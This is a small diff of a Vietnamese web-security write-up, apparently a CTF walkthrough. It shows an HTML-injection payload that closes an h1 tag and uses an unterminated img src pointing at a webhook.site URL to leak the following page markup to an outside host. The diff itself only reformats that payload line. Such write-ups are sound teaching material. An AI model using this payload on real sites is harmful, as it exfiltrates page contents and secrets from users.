@@ -42,7 +42,7 @@
 
     Ta thử với thẻ ```img``` và thấy rằng nó gửi một request tới webhook của mình kèm theo tham số là chuỗi html đằng sau 
     ```diff
-    Payload: </h1> <img src='https://webhook.site/03c97039-b00e-4820-91c6-6424602b0e7f?
+    - Payload: </h1> <img src='https://webhook.site/03c97039-b00e-4820-91c6-6424602b0e7f?
     ```
     Giải thích payload:
     - Phần </h1> là để bypass thẻ <h1> sẵn có của DOM mà ta inject
